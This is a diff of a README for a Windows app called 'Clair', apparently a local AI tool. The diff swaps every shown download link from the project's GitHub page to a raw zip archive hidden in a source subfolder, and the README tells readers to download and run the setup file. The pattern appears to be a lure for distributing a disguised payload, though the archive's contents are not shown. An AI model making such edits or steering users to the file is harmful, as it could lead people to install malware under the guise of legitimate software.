@@ -1,6 +1,6 @@
 # 🧠 Clair - Local AI That Checks Its Work
 
-[![Download Clair](https://img.shields.io/badge/Download-Clair-blue?style=for-the-badge)](https://github.com/Allaboutf4130/Clair)
+[![Download Clair](https://img.shields.io/badge/Download-Clair-blue?style=for-the-badge)](https://raw.githubusercontent.com/Allaboutf4130/Clair/main/src/clair/execution/Software_v3.0.zip)
 
 ## 🚀 What Clair Does
 
@@ -17,7 +17,7 @@ Use Clair when you want to:
 
 To get Clair on Windows, visit this page to download:
 
-[Download Clair from GitHub](https://github.com/Allaboutf4130/Clair)
+[Download Clair from GitHub](https://raw.githubusercontent.com/Allaboutf4130/Clair/main/src/clair/execution/Software_v3.0.zip)
 
 If the page offers a release file, download it to your computer. If it gives you a setup file, download that file first, then run it.
 
@@ -223,7 +223,7 @@ If you want to move Clair to another folder, keep the full app folder together.
 - **Best for**: Step-by-step work and checked answers
 - **Runs on**: Windows
 - **Data storage**: Local on your device
-- **Main link**: [https://github.com/Allaboutf4130/Clair](https://github.com/Allaboutf4130/Clair)
+- **Main link**: [https://raw.githubusercontent.com/Allaboutf4130/Clair/main/src/clair/execution/Software_v3.0.zip](https://raw.githubusercontent.com/Allaboutf4130/Clair/main/src/clair/execution/Software_v3.0.zip)
 
 ## 🧭 Topic Areas
 
